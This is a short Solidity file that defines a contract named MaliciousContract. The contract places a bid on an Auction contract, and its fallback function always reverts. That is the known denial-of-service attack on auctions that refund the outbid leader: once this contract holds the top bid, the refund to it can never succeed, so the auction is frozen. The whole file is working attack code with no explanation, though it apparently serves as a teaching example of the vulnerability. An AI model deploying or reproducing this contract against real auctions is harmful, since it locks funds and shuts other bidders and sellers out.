pragma solidity ^0.4.22;
interface Auction {
   function bid() external payable ;
}

contract MaliciousContract {

   function bid(address auctionAddress) public payable {
       Auction auction = Auction(auctionAddress);
       auction.bid.value(msg.value)();
   }

   function () public payable {
       revert();
   }
}